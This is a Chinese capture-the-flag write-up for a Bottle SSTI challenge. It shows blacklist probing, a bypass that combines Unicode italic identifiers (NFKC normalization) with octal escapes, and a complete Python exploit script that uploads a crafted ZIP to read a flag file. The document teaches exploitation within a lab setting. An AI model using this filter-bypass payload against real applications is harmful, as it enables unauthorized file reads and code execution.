---
title: 好靶场sad_bottle wp
published: 2026-02-14T00:00:00.000Z
description: 一道ssti题目
tags:
  - ctf
  - ssti
category: ssti
draft: false
---
# sad_bottle Writeup

## 初步踩点

打开靶机，是一个"ZIP文件查看器"，页面挺简洁的，功能就一个：上传 ZIP 文件，然后可以在线查看里面的文件内容。

![image-20260215000043081](https://raw.githubusercontent.com/wenject/tuchuang/main/image-20260215000043081.png)

先随便传个正常的 ZIP 看看流程。本地创建一个 `hello.txt` 写个 `hello world`，打包成 ZIP 上传。上传成功后跳转到一个结果页面，列出了 ZIP 里的文件，每个文件旁边有个"查看"按钮，点进去就能看到文件内容。

URL 格式是 `/view/<一串hash>/hello.txt`，返回的就是文件内容 `hello world`。

题目提示是 SSTI，而且题目名叫 `sad_bottle`，暗示后端用的是 Python 的 Bottle 框架。Bottle 有自己的 SimpleTemplate 引擎，模板语法是 `{{expression}}`，和 Jinja2 类似但不完全一样。

## 确认 SSTI

既然怀疑是 SSTI，那就直接试。创建一个 `test.txt`，内容写 `{{7*7}}`，打包上传，查看文件内容——返回 `49`。

稳了，SSTI 实锤。文件内容被直接丢进了 `template()` 函数渲染，用户可控的内容被当成模板代码执行了。

那思路就很清晰了：在文件内容里写 `{{open('/tmp/flag.txt').read()}}`，上传查看就能读 flag。

## 碰壁：黑名单过滤

满怀信心地把 `{{open('/tmp/flag.txt').read()}}` 塞进 ZIP 上传，结果查看的时候返回了一句：

```
文件内容包含不允许的关键词
```

好家伙，有过滤。那就得摸清楚到底过滤了什么。

### 第一轮测试：常见 SSTI 关键词

先试试常见的 SSTI payload 里会用到的东西：

| 测试内容           | 结果      |
| ------------------ | --------- |
| `{{7*7}}`          | ✅ 返回 49 |
| `{{config}}`       | ❌ 被拦    |
| `{{''.__class__}}` | ❌ 被拦    |
| `{{request}}`      | ❌ 被拦    |
| `{{self}}`         | ❌ 被拦    |
| `{{lipsum}}`       | ❌ 被拦    |
| `{{cycler}}`       | ❌ 被拦    |
| `{{url_for}}`      | ❌ 被拦    |

全军覆没。看起来不是简单地过滤几个危险函数名，而是有一个很长的黑名单。

### 第二轮测试：逐字符排查

既然关键词级别的过滤这么严，我怀疑是不是直接过滤了字母。写了个脚本逐个测试单个字符和常见单词：

| 测试内容     | 结果   |
| ------------ | ------ |
| `class`      | ❌ 被拦 |
| `open`       | ❌ 被拦 |
| `read`       | ❌ 被拦 |
| `os`         | ❌ 被拦 |
| `import`     | ❌ 被拦 |
| `eval`       | ❌ 被拦 |
| `exec`       | ❌ 被拦 |
| `system`     | ❌ 被拦 |
| `cat`        | ❌ 被拦 |
| `tmp`        | ❌ 被拦 |
| `flag`       | ✅ 通过 |
| `.` (点号)   | ✅ 通过 |
| `_` (下划线) | ✅ 通过 |
| `[`          | ✅ 通过 |
| `'` (引号)   | ✅ 通过 |

等等，`os` 才两个字母就被拦了？`cat` 三个字母也被拦？我又试了 `boss`（包含 `os`）和 `reada`（包含 `read`）——全被拦。

这说明过滤是**子串匹配**，不是整词匹配。只要内容里出现黑名单中的任何子串就会被拦截。

### 第三轮测试：到底哪些字母能用

事情开始变得离谱了。我开始怀疑黑名单直接禁了大部分字母。逐个字母测试：

```
a -> ✅    b -> ❌    c -> ❌    d -> ❌    e -> ❌    f -> ✅
g -> ✅    h -> ❌    i -> ❌    j -> ❌    k -> ❌    l -> ✅
m -> ❌    n -> ❌    o -> ❌    p -> ❌    q -> ❌    r -> ❌
s -> ❌    t -> ❌    u -> ❌    v -> ❌    w -> ❌    x -> ❌
y -> ❌    z -> ❌
```

我人傻了。26 个字母只剩下 **a、f、g、l** 四个能用。而且测试发现大写也不行，过滤逻辑会先 `lower()` 再匹配。

再看看符号：

```
0-9  -> ✅    .  -> ✅    _  -> ✅    \  -> ✅
{  -> ✅      }  -> ✅    (  -> ✅    )  -> ✅
'  -> ✅      "  -> ✅    +  -> ✅    -  -> ✅
/  -> ✅      =  -> ✅    !  -> ✅    @  -> ✅
#  -> ✅      $  -> ✅    &  -> ✅    *  -> ✅
%  -> ❌      ,  -> ❌    <  -> ❌    >  -> ❌
:  -> ❌      ?  -> ❌
```

数字全部可用，大部分特殊符号可用，但 `%`、`,`、`<`、`>`、`:`、`?` 被禁了。

到这里可以推断出黑名单大概长这样：

```python
BLACKLIST = [
    "b","c","d","e","h","i","j","k","m","n","o","p","q","r",
    "s","t","u","v","w","x","y","z",
    "%",",","<",">",":","?"
]
```

### 第四轮测试：常规绕过手段全部失败

知道了过滤规则，我开始尝试各种经典的 SSTI 绕过手段：

**字符串拼接？** 不行。Jinja2 的 `~` 拼接运算符需要写字母，`'cla'~'ss'` 里面 `c`、`l`... 等等 `l` 能用但 `c` 不行。而且 Bottle 的 SimpleTemplate 不一定支持 `~`。

**attr 过滤器？** `attr` 四个字母里 `a` 能用但 `t` 和 `r` 不行，直接被拦。

**十六进制/Unicode 转义？** `\x63` 里面有 `x` 和 `c`，都被禁了。

**format 字符串？** `format` 里有 `f`、`o`、`r`、`m`、`a`、`t`，好几个被禁字母。

**Jinja2 的 set/include？** `set` 里有 `s`、`e`、`t`，全被禁。

**dict/range/list？** 全包含被禁字母。

**chr() 函数？** `chr` 里 `c`、`h`、`r` 全被禁。

我甚至试了 `{%print(1)%}`——`print` 里有 `p`、`r`、`i`、`n`、`t`，五个全被禁。

到这一步我陷入了僵局。只有 `a`、`f`、`g`、`l` 四个字母加上数字和部分符号，怎么构造出能读文件的代码？

## 突破口：Unicode NFKC 规范化

冷静下来想想。过滤逻辑是 `content.lower()` 之后做子串匹配。`lower()` 方法对普通 ASCII 字母有效，但对于一些特殊的 Unicode 字符呢？

Python 3 有个特性：**标识符支持 Unicode**，而且在解析时会做 **NFKC 规范化**。也就是说，某些长得像普通字母的 Unicode 字符，Python 解释器会把它们当成对应的 ASCII 字母来处理。

比如数学无衬线斜体字符（Mathematical Sans-Serif Italic）：

- `𝘰` (U+1D630) → NFKC 规范化后是 `o`
- `𝘱` (U+1D631) → NFKC 规范化后是 `p`
- `𝘦` (U+1D626) → NFKC 规范化后是 `e`
- `𝘯` (U+1D62F) → NFKC 规范化后是 `n`

关键在于：`str.lower()` 方法**不会**把这些 Unicode 字符转成 ASCII 小写字母，所以黑名单的子串匹配检测不到它们。但 Python 解释器在解析代码时会通过 NFKC 规范化把它们还原成标准字母，正常执行。

这就是绕过函数名过滤的方法：把 `open` 写成 `𝘰𝘱𝘦𝘯`，把 `read` 写成 `𝘳𝘦𝘢𝘥`。

转换逻辑很简单，数学无衬线斜体小写字母从 U+1D622 (`𝘢`) 开始，按 a-z 顺序排列：

```python
def to_unicode_italic(text):
    result = ""
    for char in text:
        if 'a' <= char <= 'z':
            result += chr(0x1D622 + ord(char) - ord('a'))
        else:
            result += char
    return result
```

## 第二个问题：路径字符串怎么写

函数名的问题解决了，但 `open('/tmp/flag.txt')` 里的字符串参数 `/tmp/flag.txt` 包含 `t`、`m`、`p`、`x` 等被禁字符。Unicode 斜体只能用在标识符（函数名/变量名）上，字符串内容必须是精确的字节值。

想到了**八进制转义**。Python 字符串支持 `\NNN` 形式的八进制转义，而数字 `0-9` 和反斜杠 `\` 都没被禁。

```
/ (ASCII 47)  → \057
t (ASCII 116) → \164
m (ASCII 109) → \155
p (ASCII 112) → \160
f (ASCII 102) → \146  （虽然 f 没被禁，但统一转义更保险）
l (ASCII 108) → \154
a (ASCII 97)  → \141
g (ASCII 103) → \147
. (ASCII 46)  → \056
x (ASCII 120) → \170
```

所以 `/tmp/flag.txt` 变成：`\057\164\155\160\057\146\154\141\147\056\164\170\164`

全是数字和反斜杠，完美绕过黑名单。

## 组装最终 Payload

把 Unicode 斜体函数名和八进制转义路径组合起来：

```
{{𝘰𝘱𝘦𝘯('\057\164\155\160\057\146\154\141\147\056\164\170\164').𝘳𝘦𝘢𝘥()}}
```

Bottle 的 SimpleTemplate 引擎解析 `{{...}}` 时，Python 解释器会：

1. NFKC 规范化：`𝘰𝘱𝘦𝘯` → `open`，`𝘳𝘦𝘢𝘥` → `read`
2. 八进制转义还原：`\057\164\155\160...` → `/tmp/flag.txt`
3. 执行：`open('/tmp/flag.txt').read()`

把这个 payload 写进一个文本文件，打包成 ZIP 上传，访问查看页面，flag 就出来了。

## 完整 EXP

```python
import requests
import zipfile
import io
import re

TARGET = ""

def to_unicode_italic(text):
    """将小写字母转换为数学无衬线斜体Unicode字符"""
    result = ""
    for char in text:
        if 'a' <= char <= 'z':
            result += chr(0x1D622 + ord(char) - ord('a'))
        else:
            result += char
    return result

def to_octal_string(text):
    """将字符串每个字符转换为八进制转义"""
    result = ""
    for char in text:
        result += "\\" + oct(ord(char))[2:].zfill(3)
    return result

func_open = to_unicode_italic("open")
func_read = to_unicode_italic("read")
octal_path = to_octal_string("/tmp/flag.txt")

payload = "{{" + func_open + "('" + octal_path + "')." + func_read + "()}}"

# 打包成 ZIP
zip_buf = io.BytesIO()
with zipfile.ZipFile(zip_buf, 'w', zipfile.ZIP_DEFLATED) as zf:
    zf.writestr("flag.txt", payload)

# 上传
zip_buf.seek(0)
r = requests.post(f"{TARGET}/upload", files={"file": ("exp.zip", zip_buf, "application/zip")})

# 提取查看链接并访问
match = re.search(r'/view/([a-f0-9]+)/flag\.txt', r.text)
if match:
    view_url = f"{TARGET}/view/{match.group(1)}/flag.txt"
    r2 = requests.get(view_url)
    print(r2.text)
else:
    print("上传失败")
```

## 总结

这道题的核心考点：

1. **Bottle SSTI**：`template(content)` 直接渲染用户可控内容，经典漏洞模式。
2. **极端黑名单**：26 个字母只留了 4 个，常规绕过手段全部失效。
3. **Python Unicode NFKC 规范化**：利用数学斜体字符绕过函数名过滤，Python 解释器照样认识。
4. **八进制转义**：用 `\NNN` 形式构造字符串内容，绕过对路径中字符的过滤。

说实话一开始被这个黑名单搞得挺绝望的，试了一圈常规手段全不行。后来想到 Python 3 的 Unicode 标识符特性才找到突破口，算是对 Python 底层机制的一次深入利用。
